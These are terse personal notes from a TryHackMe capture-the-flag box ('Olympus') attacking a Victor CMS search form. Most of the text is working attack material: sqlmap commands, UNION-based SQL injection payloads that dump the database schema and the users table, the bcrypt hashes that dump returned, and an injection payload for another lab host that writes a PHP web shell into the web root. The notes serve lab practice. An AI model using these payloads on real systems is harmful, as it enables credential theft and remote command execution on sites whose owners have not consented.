victor cms

<http://olympus.thm/~webmaster/search.php>
sqli? yes, in the search post request

```
sqlmap -u olympus.thm/~webmaster/search.php --batch --method=POST --forms --crawl=2
```
```
>mysql,information_schema,performance_schema,sys,phpmyadmin,olympus
```

fuzz param?
<http://olympus.thm/~webmaster/post.php?post=6>

```
sqlmap -u olympus.thm/~webmaster/search.php --batch --method=POST --forms --crawl=2 
```

Dumps all tables, columns, and databases :DDDDDDDDDDD
```
search=GUNe' UNION SELECT NULL,NULL,NULL,json_arrayagg(concat_ws(0x3a,table_name,column_name,table_schema)),NULL,NULL,NULL,NULL,NULL,NULL from INFORMATION_SCHEMA.columns#&submit=
```

Parsing dump:
Inspect, Copy all from here, and save it to file called dump 

Parse all dump to cleaner format:
```
cat dump | tr ',' '\n' > formatted_dump.txt
```

Hunt for where credentials are stored:
```
 cat formatted_dump.txt | grep -i pass  
```

```
search=' UNION ALL SELECT NULL,NULL,NULL,json_arrayagg(concat_ws(0x3a,user_name,user_password)),NULL,NULL,NULL,NULL,NULL,NULL from olympus.users#&submit=
```

```
' UNION ALL SELECT NULL,NULL,NULL,json_arrayagg(concat_ws(0x3a,user_name,user_password)),NULL,NULL,NULL,NULL,NULL,NULL from olympus.users#
```
```
["prometheus:$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C", "root:$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK", "zeus:$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC"]
```

chats:file:olympus

```
http://marketplace.thm/admin?user=-3 UNION SELECT NULL, "<?php echo shell_exec($_GET['cmd']);?>", NULL, NULL into OUTFILE 'c:/inetpub/wwwroot/backdoor.php';--
```

![unnamed_0588b86a597240c385f623055fa91119](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/olympus/notes/{{notename}}-202605011506.png)
![unnamed_ae52e688ed7a43c19f00d8ac187ae81a](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/olympus/notes/{{notename}}-202605011506-1.png)
![unnamed_03fbbda93b6242b591dd5c734a9c10ea](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/olympus/notes/{{notename}}-202605011506-2.png)
![unnamed_af507afc4a5e4e89a6656c69e51acb99](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/olympus/notes/{{notename}}-202605011507.png)
![unnamed_f20e745e5b0043f3aae5736b5e2c2f73](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/olympus/notes/{{notename}}-202605011507-1.png)
![unnamed_c263d3aca29149f096f7df07bf2acb5d](docs/Attachments/Methodology/9.%20CTF%20Boxes/TryHackMe/olympus/notes/{{notename}}-202605011507-2.png)